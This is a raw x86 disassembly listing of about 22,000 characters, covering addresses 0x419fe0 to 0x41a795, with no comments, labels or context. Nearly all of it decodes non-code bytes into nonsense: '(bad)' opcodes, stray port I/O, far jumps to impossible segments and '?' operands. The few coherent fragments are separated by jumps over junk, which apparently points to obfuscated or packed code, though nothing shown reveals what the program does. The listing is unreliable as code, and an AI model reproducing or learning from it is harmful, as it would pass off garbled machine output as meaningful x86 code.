  419fe0:	loope  0x419fba
  419fe2:	addr16 leave 
  419fe4:	sub    al,BYTE PTR [ecx]
  419fe6:	add    BYTE PTR [eax+0x32000000],dh
  419fec:	int3   
  419fed:	xchg   esp,eax
  419fee:	fdivr  DWORD PTR [edx-0x559c7a97]
  419ff4:	jecxz  0x41a05b
  419ff6:	dec    ebx
  419ff7:	stos   BYTE PTR es:[edi],al
  419ff8:	and    BYTE PTR [esi+ecx*8-0x69],al
  419ffc:	add    edi,DWORD PTR [ebp-0xb9e6c91]
  41a002:	xchg   ecx,eax
  41a003:	xchg   ecx,eax
  41a004:	or     BYTE PTR [edi+ebp*8],dl
  41a007:	mov    WORD PTR [edx+0x22ecea0f],fs
  41a00d:	addr16 fadd st(7),st
  41a010:	and    bl,BYTE PTR [edx]
  41a012:	pop    ds
  41a013:	jle    0x41a07d
  41a015:	imul   edx,DWORD PTR ds:0x171a895,0x53f36125
  41a01f:	in     al,0x9c
  41a021:	ss ins DWORD PTR es:[edi],dx
  41a023:	cli    
  41a024:	xchg   ecx,eax
  41a025:	sub    al,BYTE PTR [eax-0x32]
  41a028:	loopne 0x419fcb
  41a02a:	icebp  
  41a02b:	mov    ecx,0x2f02d060
  41a030:	repnz cs jmp 0x4077:0x27fcd984
  41a039:	daa    
  41a03a:	pop    eax
  41a03b:	ret    
  41a03c:	popf   
  41a03d:	pop    esi
  41a03e:	sbb    bl,BYTE PTR [edi-0x1a]
  41a041:	lea    ebx,[esi]
  41a043:	push   esp
  41a044:	jb     0x41a077
  41a046:	pop    eax
  41a047:	pusha  
  41a048:	fisttp DWORD PTR [eax+0x43491b1b]
  41a04e:	lea    eax,[eax+0x16b87c57]
  41a054:	mov    dl,0x8f
  41a056:	and    DWORD PTR [ebx+0x14db93a9],edi
  41a05c:	in     al,dx
  41a05d:	sub    al,0x21
  41a05f:	sub    al,BYTE PTR [edx]
  41a061:	fdiv   st(4),st
  41a063:	push   ebx
  41a064:	sub    DWORD PTR [ebx-0x22eb6821],edi
  41a06a:	leave  
  41a06b:	dec    esp
  41a06c:	push   esp
  41a06d:	pop    ebx
  41a06e:	data16 fucom st(2)
  41a071:	fwait
  41a072:	mov    eax,0x273327f7
  41a077:	jnp    0x41a010
  41a079:	out    dx,eax
  41a07a:	aam    0xa5
  41a07c:	adc    al,BYTE PTR [ecx+ebx*4]
  41a07f:	sbb    al,0x89
  41a081:	pop    esp
  41a082:	xlat   BYTE PTR ds:[ebx]
  41a083:	jo     0x41a089
  41a085:	or     DWORD PTR [edi-0x4d],edi
  41a088:	inc    eax
  41a089:	(bad)  
  41a08a:	mov    bl,BYTE PTR [ecx+0x1f]
  41a08d:	test   al,0x23
  41a08f:	xchg   esp,eax
  41a090:	(bad)  
  41a091:	ror    BYTE PTR [edx],1
  41a093:	out    0xd1,eax
  41a095:	aaa    
  41a096:	mov    ebp,0x1dac49cb
  41a09b:	mov    eax,DWORD PTR [ebp-0x8]
  41a09e:	mov    ecx,DWORD PTR [ebp-0x4]
  41a0a1:	push   0xecb
  41a0a6:	push   ecx
  41a0a7:	push   eax
  41a0a8:	jmp    0x41a175
  41a0ad:	fsub   QWORD PTR [eax-0x3282339f]
  41a0b3:	std    
  41a0b4:	mov    al,0xb8
  41a0b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0b7:	pop    ebp
  41a0b8:	ret    
  41a0b9:	shl    DWORD PTR [esi-0x2c],0xe4
  41a0bd:	jns    0x41a0ea
  41a0bf:	add    DWORD PTR [eax],eax
  41a0c1:	mov    al,0x0
  41a0c3:	add    BYTE PTR [eax],al
  41a0c5:	or     esi,DWORD PTR [ebx-0x7ce81f0c]
  41a0cb:	inc    eax
  41a0cc:	inc    esi
  41a0cd:	and    edi,DWORD PTR [esp+ebp*1+0x66]
  41a0d1:	push   edx
  41a0d2:	mov    al,ss:0xa51a926f
  41a0d8:	nop
  41a0d9:	neg    DWORD PTR [ecx]
  41a0db:	rcl    BYTE PTR [edx-0x7033dc2e],cl
  41a0e1:	mov    cl,0xaf
  41a0e3:	addr16 xor al,0xf6
  41a0e6:	mov    ch,0xdc
  41a0e8:	je     0x41a0c8
  41a0ea:	lahf   
  41a0eb:	or     DWORD PTR [ecx],edi
  41a0ed:	sbb    BYTE PTR [edx-0x64],0x99
  41a0f1:	pop    ecx
  41a0f2:	(bad)  
  41a0f3:	xlat   BYTE PTR ds:[ebx]
  41a0f4:	test   DWORD PTR [ebx+0x1a903a0e],esi
  41a0fa:	dec    edi
  41a0fb:	pop    eax
  41a0fc:	out    dx,al
  41a0fd:	outs   dx,BYTE PTR ds:[esi]
  41a0fe:	and    al,0x94
  41a100:	push   ecx
  41a101:	in     al,dx
  41a102:	cdq    
  41a103:	jo     0x41a151
  41a105:	jmp    0x41a0a7
  41a107:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a108:	dec    esp
  41a109:	inc    eax
  41a10a:	mov    ebx,0x4f2b5554
  41a10f:	aad    0x1a
  41a111:	stos   DWORD PTR es:[edi],eax
  41a112:	xchg   esi,eax
  41a113:	inc    esp
  41a114:	imul   esp,DWORD PTR ds:0x47534837,0xc8cefaa4
  41a11e:	dec    ecx
  41a11f:	mov    es,WORD PTR [ebp-0x13]
  41a122:	dec    ecx
  41a123:	int3   
  41a124:	xchg   BYTE PTR [ebx+edx*1],al
  41a127:	les    edi,FWORD PTR [eax-0x6f]
  41a12a:	icebp  
  41a12b:	lahf   
  41a12c:	and    cl,ah
  41a12e:	lds    ecx,FWORD PTR [edx]
  41a130:	rol    BYTE PTR [ebx],1
  41a132:	or     bl,ah
  41a134:	or     cl,BYTE PTR [ebp-0x59b9ff20]
  41a13a:	sbb    DWORD PTR ds:0x1901b517,ecx
  41a140:	mov    esp,0xb929b362
  41a145:	enter  0xa3d8,0x59
  41a149:	xchg   esp,eax
  41a14a:	inc    ebx
  41a14b:	rcl    BYTE PTR [eax],1
  41a14d:	mov    WORD PTR [esi+ebp*4-0x57fc189c],es
  41a154:	jle    0x41a117
  41a156:	jp     0x41a104
  41a158:	and    eax,DWORD PTR [edi]
  41a15a:	imul   edi,eax,0xbadd0d65
  41a160:	in     eax,0xad
  41a162:	sbb    DWORD PTR [eax-0x3ce7e8fe],esi
  41a168:	push   0xffffffe5
  41a16a:	mov    eax,ds:0xea33cfb0
  41a16f:	sub    ebp,DWORD PTR [edx]
  41a171:	(bad)
  41a174:	xor    al,0xe8
  41a176:	push   ebp
  41a177:	add    al,BYTE PTR [ecx]
  41a179:	add    BYTE PTR [ebx+0x758bf04d],cl
  41a17f:	hlt    
  41a180:	sub    eax,ecx
  41a182:	mov    ecx,DWORD PTR [ebp-0x18]
  41a185:	sbb    edx,esi
  41a187:	jmp    0x41a254
  41a18c:	ins    BYTE PTR es:[edi],dx
  41a18d:	mov    cl,0xc8
  41a18f:	rcr    ch,1
  41a191:	stc    
  41a192:	jl     0x41a151
  41a194:	add    ah,BYTE PTR [ebx-0x6818ee1b]
  41a19a:	jl     0x41a1ea
  41a19c:	sub    DWORD PTR [ecx+eax*1],ebp
  41a19f:	add    BYTE PTR [eax-0x69000000],dh
  41a1a5:	stos   DWORD PTR es:[edi],eax
  41a1a6:	cmp    BYTE PTR ds:0xff7ecf76,ah
  41a1ac:	fld    TBYTE PTR [edi+0x1f520e06]
  41a1b2:	mov    edx,0x77515ce4
  41a1b7:	sbb    dl,BYTE PTR [esi-0x29]
  41a1ba:	js     0x41a1e4
  41a1bc:	mov    bh,0x71
  41a1be:	inc    esi
  41a1bf:	mov    ah,0xde
  41a1c1:	(bad)  
  41a1c2:	enter  0x63f,0x5b
  41a1c6:	pushf  
  41a1c7:	ret    0x42d5
  41a1ca:	add    ah,BYTE PTR [ebp-0x5d]
  41a1cd:	mov    bl,BYTE PTR [ebp-0x58]
  41a1d0:	out    dx,eax
  41a1d1:	ds cmp al,0xfc
  41a1d4:	mov    bp,0xaeea
  41a1d8:	mov    ebp,0x5a2a9f3b
  41a1de:	cld    
  41a1df:	ret    
  41a1e0:	dec    ebp
  41a1e1:	test   al,ah
  41a1e3:	xchg   ebp,eax
  41a1e4:	fsubr  QWORD PTR [eax-0x4f]
  41a1e7:	repnz in eax,0x5c
  41a1ea:	xor    cl,BYTE PTR [ebx+0xb]
  41a1ed:	inc    esi
  41a1ee:	arpl   bp,si
  41a1f0:	popw   ds
  41a1f2:	in     eax,0x5d
  41a1f4:	shl    DWORD PTR [ebp+0x2c],0xc1
  41a1f8:	mov    al,0x89
  41a1fa:	fstp   QWORD PTR [eax+0x4a]
  41a1fd:	clc    
  41a1fe:	mov    al,ds:0xa4417e28
  41a203:	mov    esp,0xc71b2853
  41a208:	(bad)  
  41a209:	repnz inc esi
  41a20b:	je     0x41a196
  41a20d:	test   BYTE PTR [eax],ah
  41a20f:	cmp    al,0x7c
  41a211:	jmp    0x90a2ddf1
  41a216:	test   DWORD PTR [eax+0x1119198d],ebp
  41a21c:	test   DWORD PTR fs:[eiz*2+0x40e862d5],edi
  41a224:	mov    esi,0x8511f34d
  41a229:	jle    0x41a1b5
  41a22b:	jg     0x41a22f
  41a22d:	jmp    0x41a2a5
  41a22f:	xor    eax,DWORD PTR [eax+0x70]
  41a232:	mov    edx,0xebed4eb9
  41a237:	pop    ebp
  41a238:	xchg   esi,eax
  41a239:	and    al,0x4a
  41a23b:	pop    ecx
  41a23c:	test   eax,0xa4dbb0ff
  41a241:	mov    ds:0x9f247813,al
  41a246:	mov    dl,0xd9
  41a248:	sub    eax,0x5dc0cbda
  41a24d:	test   al,0xfb
  41a24f:	std    
  41a250:	cmp    DWORD PTR [ecx-0x67],0xffffffd3
  41a254:	mov    esi,DWORD PTR [ebp-0x14]
  41a257:	jmp    0x41a324
  41a25c:	fidiv  WORD PTR [esi+0x4]
  41a25f:	xchg   ecx,eax
  41a260:	lods   al,BYTE PTR ds:[esi]
  41a261:	repz fistp QWORD PTR [edi+0x67]
  41a265:	sub    edi,DWORD PTR [edx+0x7fa87b92]
  41a26b:	int    0xd9
  41a26d:	sub    al,0x1
  41a26f:	add    BYTE PTR [eax-0x4e000000],dh
  41a275:	arpl   WORD PTR [edi+0x74],bp
  41a278:	pop    edi
  41a279:	popa   
  41a27a:	inc    edx
  41a27b:	and    BYTE PTR [ecx-0x54b68cad],0x1e
  41a282:	pop    ebp
  41a283:	cmp    al,0xa
  41a285:	hlt    
  41a286:	add    eax,0x463e0f1d
  41a28b:	iret   
  41a28c:	call   0x777f:0x5ce46f0d
  41a293:	fld    st(1)
  41a295:	cmp    eax,DWORD PTR [ecx-0x2987b34]
  41a29b:	or     esi,DWORD PTR [edi]
  41a29d:	add    BYTE PTR [esi-0x40],0xb4
  41a2a1:	inc    ebx
  41a2a2:	ins    BYTE PTR es:[edi],dx
  41a2a3:	(bad)  
  41a2a4:	cwde   
  41a2a5:	das    
  41a2a6:	add    DWORD PTR [ebx+0x4d785347],ebp
  41a2ac:	loope  0x41a297
  41a2ae:	test   eax,0xe79f0198
  41a2b3:	push   edx
  41a2b4:	ins    BYTE PTR es:[edi],dx
  41a2b5:	push   ss
  41a2b6:	int3   
  41a2b7:	cmp    bh,BYTE PTR [esi+0x6d]
  41a2ba:	pop    esp
  41a2bb:	cmp    ch,dl
  41a2bd:	out    0x5c,eax
  41a2bf:	mov    cl,0x3b
  41a2c1:	xchg   edx,eax
  41a2c2:	or     al,0x98
  41a2c4:	or     BYTE PTR [eax+eiz*8-0x1e26980d],bl
  41a2cb:	jo     0x41a2c0
  41a2cd:	or     esi,edx
  41a2cf:	outs   dx,DWORD PTR ds:[esi]
  41a2d0:	pop    esi
  41a2d1:	std    
  41a2d2:	cmp    eax,0xf195bb1
  41a2d7:	jle    0x41a2e5
  41a2d9:	jae    0x41a2c0
  41a2db:	and    esp,ebx
  41a2dd:	xchg   esi,eax
  41a2de:	stc    
  41a2df:	push   edx
  41a2e0:	pop    ss
  41a2e1:	adc    DWORD PTR [edi-0x9],edx
  41a2e4:	cmp    DWORD PTR [eax-0x3b6ab392],ebp
  41a2ea:	call   0x30ceed86
  41a2ef:	dec    ebx
  41a2f0:	push   cs
  41a2f1:	xchg   DWORD PTR [eax+0x2b],ebp
  41a2f4:	jns    0x41a2ed
  41a2f6:	fnsave [ecx+0x58aa9379]
  41a2fc:	mov    ebp,0xa6cc4414
  41a301:	push   ss
  41a302:	pop    esp
  41a303:	xchg   ecx,eax
  41a304:	aam    0x29
  41a306:	push   esp
  41a307:	pop    eax
  41a308:	and    al,0x54
  41a30a:	dec    ebx
  41a30b:	dec    ebp
  41a30c:	mov    DWORD PTR [esi+0x69],0x543f0d74
  41a313:	pop    ebx
  41a314:	pop    ss
  41a315:	mov    ebp,0x465cbfe2
  41a31a:	aad    0x77
  41a31c:	jecxz  0x41a2f4
  41a31e:	mov    dl,0xf0
  41a320:	jns    0x41a2ed
  41a322:	mov    eax,0x4b55258c
  41a327:	add    BYTE PTR [eax],al
  41a329:	jmp    0x41a3f6
  41a32e:	or     al,BYTE PTR [ebx-0x2e]
  41a331:	jmp    0xdcba:0xe33afbdb
  41a338:	mov    al,ds:0xca5c5133
  41a33d:	fimul  WORD PTR [ecx-0x4ffffed3]
  41a343:	add    BYTE PTR [eax],al
  41a345:	add    BYTE PTR [edi],al
  41a347:	jmp    0x45b7:0x27acebc4
  41a34e:	nop
  41a34f:	cmp    al,0xb2
  41a351:	popf   
  41a352:	out    0x93,eax
  41a354:	xchg   BYTE PTR [eax],bl
  41a356:	scas   eax,DWORD PTR es:[edi]
  41a357:	inc    edx
  41a358:	mov    dl,0xcc
  41a35a:	pushf  
  41a35b:	mov    WORD PTR [eax+0xd8a9e35],?
  41a361:	jp     0x41a340
  41a363:	pop    ds
  41a364:	xchg   DWORD PTR [eax+0x5d],esi
  41a367:	aam    0x22
  41a369:	dec    esi
  41a36a:	adc    ah,ah
  41a36c:	in     al,0xcc
  41a36e:	or     al,0xa3
  41a370:	cdq    
  41a371:	push   eax
  41a372:	push   ebx
  41a373:	sbb    dh,ah
  41a375:	fisttp QWORD PTR cs:[esi]
  41a378:	mov    eax,0x1d143811
  41a37d:	(bad)  
  41a37e:	mov    BYTE PTR [ebx-0x50b9165b],ah
  41a384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a385:	call   0x6f818084
  41a38a:	and    bh,BYTE PTR [ecx-0x56]
  41a38d:	jae    0x41a396
  41a38f:	cs fucomip st,st(6)
  41a392:	cmp    al,0xa6
  41a394:	mov    cs,WORD PTR [edi+0x4d]
  41a397:	jnp    0x41a327
  41a399:	mov    dh,0xa2
  41a39b:	imul   ecx,esi,0xffffff99
  41a39e:	push   ss
  41a39f:	jp     0x41a34b
  41a3a1:	and    esi,eax
  41a3a3:	sub    ah,dh
  41a3a5:	mov    ah,0xcc
  41a3a7:	dec    ebp
  41a3a8:	or     dl,BYTE PTR [ecx+0x28]
  41a3ab:	jae    0x41a3d3
  41a3ad:	cmp    al,0x65
  41a3af:	fucomp st(7)
  41a3b1:	jbe    0x41a36f
  41a3b3:	das    
  41a3b4:	inc    edx
  41a3b5:	dec    esi
  41a3b6:	xchg   edx,eax
  41a3b7:	lock (bad) 
  41a3b9:	in     al,dx
  41a3ba:	stos   BYTE PTR es:[edi],al
  41a3bb:	push   cs
  41a3bc:	cmp    cl,BYTE PTR [eax-0x3458ba20]
  41a3c2:	sbb    esp,0x956da3dc
  41a3c8:	idiv   DWORD PTR [esi]
  41a3ca:	test   edx,ebx
  41a3cc:	int3   
  41a3cd:	mov    al,ds:0xb5c91e
  41a3d2:	sub    DWORD PTR [ecx],esi
  41a3d4:	ins    BYTE PTR es:[edi],dx
  41a3d5:	std    
  41a3d6:	pop    edi
  41a3d7:	jmp    0x41a3d4
  41a3d9:	jbe    0x41a3e5
  41a3db:	xchg   ebx,eax
  41a3dc:	popa   
  41a3dd:	int    0x8c
  41a3df:	sbb    ah,BYTE PTR [esi+0x17121fa]
  41a3e5:	lea    edx,[ecx]
  41a3e7:	popf   
  41a3e8:	xor    eax,0x911b3c2d
  41a3ed:	pop    eax
  41a3ee:	adc    ebx,DWORD PTR gs:[ebp+ecx*8+0x29]
  41a3f3:	aam    0xdb
  41a3f5:	arpl   WORD PTR [ebx],si
  41a3f7:	rol    DWORD PTR [ecx+0x3be5e2],0x0
  41a3fe:	jmp    0x41a4cb
  41a403:	rol    eax,0x8a
  41a406:	jmp    0x41a393
  41a408:	jmp    0x41a3eb
  41a40a:	jmp    0xafab:0xcd40059a
  41a411:	aaa    
  41a412:	les    edi,FWORD PTR [ecx]
  41a414:	add    DWORD PTR cs:[eax],eax
  41a417:	mov    al,0x0
  41a419:	add    BYTE PTR [eax],al
  41a41b:	mov    bh,0xb5
  41a41d:	pop    es
  41a41e:	jno    0x41a47d
  41a420:	mov    dh,0x2a
  41a422:	inc    esi
  41a423:	cmp    al,0xfb
  41a425:	jmp    0x8204:0x3dfd2f3e
  41a42c:	xchg   esi,eax
  41a42d:	(bad)  
  41a42e:	push   ebp
  41a42f:	repz push eax
  41a431:	adc    BYTE PTR [edi],al
  41a433:	jb     0x41a450
  41a435:	mov    bl,0x26
  41a437:	jo     0x41a411
  41a439:	es sub al,0x24
  41a43c:	test   al,0xd
  41a43e:	rcl    BYTE PTR [edx+0x6e0d29a6],0xe2
  41a445:	xchg   ebp,eax
  41a446:	gs std 
  41a448:	inc    edi
  41a449:	pop    ss
  41a44a:	mov    ?,edi
  41a44c:	js     0x41a40e
  41a44e:	hlt    
  41a44f:	(bad)  
  41a450:	loopne 0x41a41c
  41a452:	or     al,0x3b
  41a454:	in     eax,dx
  41a455:	imul   eax,DWORD PTR [ecx],0x19d548ba
  41a45b:	shl    BYTE PTR [esp+edx*1+0x2a],0x8c
  41a460:	mov    ah,0x21
  41a462:	pop    ds
  41a463:	jg     0x41a4a6
  41a465:	pushw  ds
  41a467:	mov    bh,0x7b
  41a469:	mov    DWORD PTR [edi-0x38],ebx
  41a46c:	cwde   
  41a46d:	jns    0x41a419
  41a46f:	clc    
  41a470:	fistp  QWORD PTR [edx+0x439397]
  41a476:	jl     0x41a43b
  41a478:	aad    0x84
  41a47a:	(bad)  
  41a47b:	mov    edi,0xdc17487a
  41a480:	adc    dl,BYTE PTR [eax]
  41a482:	es jmp 0xe92f:0xb6b62c02
  41a48a:	xor    bh,cl
  41a48c:	dec    edx
  41a48d:	sar    edx,1
  41a48f:	dec    edx
  41a490:	dec    ebp
  41a491:	fs jp  0x41a437
  41a494:	ror    DWORD PTR [edi],0x5b
  41a497:	jbe    0x41a42c
  41a499:	push   ebx
  41a49a:	in     eax,dx
  41a49b:	repz dec esp
  41a49d:	mov    ah,0xb9
  41a49f:	mov    bh,0xdf
  41a4a1:	aam    0xf3
  41a4a3:	aad    0xaa
  41a4a5:	and    bh,dh
  41a4a7:	fcmovnbe st,st(4)
  41a4a9:	jo     0x41a4c5
  41a4ab:	(bad)  
  41a4ac:	addr16 je 0x41a453
  41a4af:	outs   dx,BYTE PTR es:[esi]
  41a4b1:	popf   
  41a4b2:	loopne 0x41a4d0
  41a4b4:	xchg   edx,eax
  41a4b5:	dec    ebx
  41a4b6:	movhps QWORD PTR [edi],xmm7
  41a4b9:	mov    esi,0x4c1e29e8
  41a4be:	add    DWORD PTR [ebx],0xae0bf39c
  41a4c4:	jne    0x41a4f5
  41a4c6:	jg     0x341f03c5
  41a4cc:	(bad)  
  41a4cd:	add    eax,0x66473db3
  41a4d2:	adc    edx,0xffff221a
  41a4d8:	mov    edi,0x8dacd260
  41a4dd:	xor    eax,edi
  41a4df:	mov    DWORD PTR [ebp-0x18],eax
  41a4e2:	mov    esi,0xacff
  41a4e7:	xor    edx,esi
  41a4e9:	mov    DWORD PTR [ebp-0x14],edx
  41a4ec:	mov    eax,DWORD PTR [ebp-0x20]
  41a4ef:	mov    ecx,DWORD PTR [ebp-0x1c]
  41a4f2:	mov    edx,DWORD PTR [ebp-0x28]
  41a4f5:	mov    ebx,DWORD PTR [ebp-0x24]
  41a4f8:	and    ecx,ebx
  41a4fa:	and    eax,edx
  41a4fc:	mov    edx,DWORD PTR [ebp-0x30]
  41a4ff:	mov    ebx,DWORD PTR [ebp-0x2c]
  41a502:	add    eax,0xfffff11a
  41a507:	jmp    0x41a5d4
  41a50c:	in     eax,dx
  41a50d:	and    eax,0xbfffb73f
  41a512:	in     eax,dx
  41a513:	jg     0x41a591
  41a515:	fwait
  41a516:	sub    bl,BYTE PTR [edi+0x659ebd22]
  41a51c:	jmp    0xb041a64f
  41a521:	add    BYTE PTR [eax],al
  41a523:	add    BYTE PTR [eax],ah
  41a525:	add    al,0xef
  41a527:	in     eax,dx
  41a528:	hlt    
  41a529:	je     0x41a59e
  41a52b:	or     BYTE PTR [edi],0x51
  41a52e:	imul   edi,ebx,0xf265175a
  41a534:	sar    BYTE PTR [edx],1
  41a536:	scas   al,BYTE PTR es:[edi]
  41a537:	xchg   ebp,eax
  41a538:	sar    DWORD PTR [ecx],0xce
  41a53b:	sar    cl,0x76
  41a53e:	idiv   BYTE PTR [esi+0x35cc6914]
  41a544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a546:	fdivr  DWORD PTR [ecx-0x6a]
  41a549:	sub    ebp,DWORD PTR [ebx+ebx*8-0x34]
  41a54d:	(bad)  
  41a54e:	cld    
  41a54f:	je     0x41a4de
  41a551:	push   esi
  41a552:	mov    dl,0xd9
  41a554:	leave  
  41a555:	sti    
  41a556:	out    dx,al
  41a557:	mov    WORD PTR [ebx],fs
  41a559:	xchg   dh,al
  41a55b:	call   0x4566:0xb602d01d
  41a562:	or     eax,0x9cfb4422
  41a567:	popf   
  41a568:	xchg   ecx,eax
  41a569:	repz repnz mov bh,0x16
  41a56d:	cwde   
  41a56e:	icebp  
  41a56f:	aaa    
  41a570:	push   es
  41a571:	mov    edi,0x6d4ae3f1
  41a576:	mov    ebx,0x8692cf21
  41a57b:	jno    0x41a525
  41a57d:	cmp    eax,0xf574bf31
  41a582:	xor    BYTE PTR [esi+0x79b81112],bl
  41a588:	test   BYTE PTR [esi+0x6],dh
  41a58b:	xor    eax,0x56223692
  41a590:	in     al,dx
  41a591:	outs   dx,DWORD PTR ds:[esi]
  41a592:	dec    esi
  41a593:	pop    ds
  41a594:	pushf  
  41a595:	test   BYTE PTR [ebp+0x465e4ed2],bh
  41a59b:	cmp    ah,cl
  41a59d:	fadd   st(3),st
  41a59f:	jg     0x41a58b
  41a5a1:	aaa    
  41a5a2:	xchg   al,dl
  41a5a4:	xor    DWORD PTR [ebx-0xd869007],0xba0c3c57
  41a5ae:	mov    ecx,0x45551c2
  41a5b3:	es push ebx
  41a5b5:	call   0xd140:0x76782190
  41a5bc:	lea    esi,[ecx+0x1c]
  41a5bf:	shr    BYTE PTR [ebp+0x39a79777],cl
  41a5c5:	gs lock scas al,BYTE PTR es:[edi]
  41a5c8:	dec    esp
  41a5c9:	adc    DWORD PTR [ebx+0x5d],esi
  41a5cc:	inc    ebx
  41a5cd:	loop   0x41a572
  41a5cf:	cs hlt 
  41a5d1:	sub    BYTE PTR ds:[ecx+eax*4+0x13f7d1],ch
  41a5d9:	add    BYTE PTR ds:0x27e5,ah
  41a5df:	jmp    0x41a6ac
  41a5e4:	and    DWORD PTR [ecx+0x7f],ebx
  41a5e7:	push   ss
  41a5e8:	jg     0x41a620
  41a5ea:	imul   edi,DWORD PTR [edi+0x77],0x71a192a5
  41a5f1:	int    0x55
  41a5f3:	lahf   
  41a5f4:	cdq    
  41a5f5:	das    
  41a5f6:	add    DWORD PTR [eax],eax
  41a5f8:	mov    al,0x0
  41a5fa:	add    BYTE PTR [eax],al
  41a5fc:	es (bad) 
  41a5fe:	enter  0xddc7,0x8b
  41a602:	cmp    esi,edi
  41a604:	ret    0x780
  41a607:	inc    ebx
  41a608:	outs   dx,BYTE PTR ds:[esi]
  41a609:	xor    DWORD PTR [edi+0x704d5fd8],0x15
  41a610:	(bad)  
  41a612:	jmp    0xc1cb:0x697093ed
  41a619:	enter  0xc3e7,0x23
  41a61d:	cdq    
  41a61e:	arpl   WORD PTR ds:0x4c9c231a,dx
  41a624:	adc    ecx,DWORD PTR ds:0xe9a1aced
  41a62a:	cmp    al,0x1c
  41a62c:	push   esi
  41a62d:	inc    esi
  41a62e:	fcom   DWORD PTR [ecx+0x799c9fab]
  41a634:	ret    
  41a635:	mov    ebx,0xa05b191
  41a63a:	cld    
  41a63b:	dec    eax
  41a63c:	jge    0x41a6ae
  41a63e:	lea    ebx,[edi]
  41a640:	push   es
  41a641:	into   
  41a642:	push   0x73424b74
  41a647:	pop    edx
  41a648:	dec    ecx
  41a649:	fdivp  st(1),st
  41a64b:	neg    DWORD PTR [ecx]
  41a64d:	ret    0xf31
  41a650:	xchg   ebx,eax
  41a651:	mov    dh,0xe7
  41a653:	into   
  41a654:	cmp    BYTE PTR [edi-0xe7ea856],cl
  41a65a:	inc    DWORD PTR [eax+edi*2-0x3]
  41a65e:	pop    eax
  41a65f:	pop    ebx
  41a660:	xor    eax,0x9fc89da6
  41a665:	mov    ch,0x9b
  41a667:	pop    edx
  41a668:	xchg   edx,eax
  41a669:	fst    st(3)
  41a66b:	jmp    0xdd5:0x61bf1c41
  41a672:	cmp    ebp,DWORD PTR [eax-0x5f]
  41a675:	lods   eax,DWORD PTR ds:[esi]
  41a676:	into   
  41a677:	adc    ebp,ebp
  41a679:	imul   ecx,DWORD PTR [edi-0x33c86ef5],0x68
  41a680:	xlat   BYTE PTR ds:[ebx]
  41a681:	cmp    eax,0x1623f1a
  41a686:	sub    BYTE PTR es:[esi],0x1a
  41a68a:	pop    ebp
  41a68b:	jl     0x41a67d
  41a68d:	and    ebx,eax
  41a68f:	pusha  
  41a690:	in     eax,0x9e
  41a692:	inc    eax
  41a693:	inc    ebx
  41a694:	xchg   edi,eax
  41a695:	mov    ebp,0x1650f858
  41a69a:	ja     0x41a6ef
  41a69c:	popf   
  41a69d:	mov    ebx,0x1d27956c
  41a6a2:	push   esp
  41a6a3:	pop    es
  41a6a4:	xchg   BYTE PTR [ecx+0x6c],ah
  41a6a7:	xchg   esi,eax
  41a6a8:	in     al,dx
  41a6a9:	std    
  41a6aa:	xor    edx,ebp
  41a6ac:	and    ecx,0x70fb
  41a6b2:	jmp    0x41a77f
  41a6b7:	sbb    eax,0xff9d6ba3
  41a6bc:	(bad)  
  41a6be:	mov    ds:0x9f7c47b8,eax
  41a6c3:	loope  0x41a717
  41a6c5:	or     edx,DWORD PTR [ebp+0x13049]
  41a6cb:	mov    al,0x0
  41a6cd:	add    BYTE PTR [eax],al
  41a6cf:	test   DWORD PTR [edi],esp
  41a6d1:	sar    DWORD PTR [eax],0x72
  41a6d4:	mov    ebx,0xf16e553a
  41a6d9:	inc    edx
  41a6da:	adc    al,ch
  41a6dc:	(bad)  
  41a6dd:	in     eax,dx
  41a6de:	sub    ch,BYTE PTR [ebx+edx*2+0x63]
  41a6e2:	inc    eax
  41a6e3:	sub    eax,0xf245b9d0
  41a6e8:	adc    ebp,0xffffff8f
  41a6eb:	shl    DWORD PTR [eax-0x6dde6310],cl
  41a6f1:	adc    eax,DWORD PTR [edi-0x1]
  41a6f4:	mov    bl,0xb1
  41a6f6:	sti    
  41a6f7:	jg     0x41a6ed
  41a6f9:	dec    ebp
  41a6fa:	sub    ecx,DWORD PTR [ebx+0x22e5b8b7]
  41a700:	aaa    
  41a701:	mov    ds:0xe14b4b5d,eax
  41a706:	adc    al,0x1
  41a708:	jo     0x41a6af
  41a70a:	sub    bh,dl
  41a70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a70d:	dec    ebp
  41a70e:	mov    esi,es
  41a710:	cdq    
  41a711:	shr    DWORD PTR [esi-0x264a7161],cl
  41a717:	mov    ?,WORD PTR [edi]
  41a719:	or     esp,DWORD PTR [esi]
  41a71b:	mov    al,0xb1
  41a71d:	stos   BYTE PTR es:[edi],al
  41a71e:	shl    BYTE PTR [ebx],0x55
  41a721:	or     bh,dh
  41a723:	push   es
  41a724:	(bad)  
  41a726:	lods   eax,DWORD PTR ds:[esi]
  41a727:	and    dl,BYTE PTR [ebx+0x7f]
  41a72a:	jns    0x41a6cf
  41a72c:	adc    ebp,ebp
  41a72e:	dec    edi
  41a72f:	and    ecx,esp
  41a731:	ss push 0x2c
  41a734:	mov    esi,0xabc476b3
  41a739:	pop    ebx
  41a73a:	js     0x41a700
  41a73c:	lock retf 
  41a73e:	or     DWORD PTR [eax+0x691f788f],ebp
  41a744:	jge    0x41a74c
  41a746:	outs   dx,DWORD PTR ds:[esi]
  41a747:	add    bl,BYTE PTR [ecx]
  41a749:	fcmove st,st(0)
  41a74b:	pop    ds
  41a74c:	push   eax
  41a74d:	xchg   ebp,eax
  41a74e:	mov    BYTE PTR [ebx+eax*1+0x53945f40],dl
  41a755:	(bad)  
  41a757:	(bad)  
  41a758:	sbb    al,0x85
  41a75a:	xchg   BYTE PTR [edx-0x5b73f532],dh
  41a760:	rol    DWORD PTR [esi+0x58a34e2],0x28
  41a767:	call   0xeb3f:0xb70fd93
  41a76e:	lods   eax,DWORD PTR ds:[esi]
  41a76f:	jno    0x41a7b2
  41a771:	and    BYTE PTR [esi],dl
  41a773:	nop
  41a774:	in     al,dx
  41a775:	out    0xf8,al
  41a777:	and    al,0x7c
  41a779:	sub    dh,BYTE PTR [eax-0x251eff06]
  41a77f:	push   ebx
  41a780:	jmp    0x41a84d
  41a785:	jle    0x41a7da
  41a787:	and    ch,BYTE PTR [edi-0x2c0000d1]
  41a78d:	data16 jnp 0x41a75e
  41a790:	mov    ebx,0x4ecc440a
  41a795:	stc    
